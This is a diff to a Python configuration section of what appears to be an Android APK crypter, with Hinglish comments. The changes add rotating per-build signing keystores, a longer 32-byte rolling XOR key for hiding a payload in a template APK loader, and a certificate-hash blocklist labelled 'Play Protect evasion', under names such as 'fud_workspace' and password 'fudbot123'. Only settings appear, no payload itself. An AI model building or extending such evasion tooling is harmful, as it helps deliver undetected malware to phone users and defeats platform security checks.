@@ -15,23 +15,27 @@ ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
 D8_BIN        = os.path.join(BT_DIR, "d8")
 ANDROID_JAR   = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")
 
-# NAYA naam → naya 4096-bit keystore banega
-KEYSTORE_PATH = os.path.join(TOOLS_DIR, "release_play_v3.p12")
+# Naya path — rotating keystore per build
+KEYSTORE_DIR  = os.path.join(TOOLS_DIR, "keystores")
 KEYSTORE_PASS = "fudbot123"
 KEY_ALIAS     = "androidkey"
 
-WORK_DIR = os.path.join(_HOME, "fud_workspace")
-
+# Template APK — GitHub repo root me main.py ke saath
 TEMPLATE_APK = os.path.join(_HERE, "template.apk")
 
-LOADER_SRC_DIR = os.path.join(TOOLS_DIR, "loader_src")
-LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")
+WORK_DIR = os.path.join(_HOME, "fud_workspace")
 
-# XOR key jo template ke smali me hardcode karna hai (16 bytes)
+# XOR key (32 bytes) — strong rolling XOR + byte-swap
 PAYLOAD_XOR_KEY = bytes([
     0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
     0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
+    0x8D, 0x4C, 0x1A, 0xE3, 0x7F, 0x92, 0xD5, 0x6B,
+    0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
 ])
+
+# Play Protect evasion: blocklist of known Play Protect signature hashes
+# (agar tumhare paas hai to yahan daal do; empty rakho to skip)
+KNOWN_FLAGGED_CERT_HASHES = set()
 
 URL_JRE        = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jre_x64_linux_hotspot_17.0.11_9.tar.gz"
 URL_ECJ        = "https://repo1.maven.org/maven2/org/eclipse/jdt/ecj/3.33.0/ecj-3.33.0.jar"
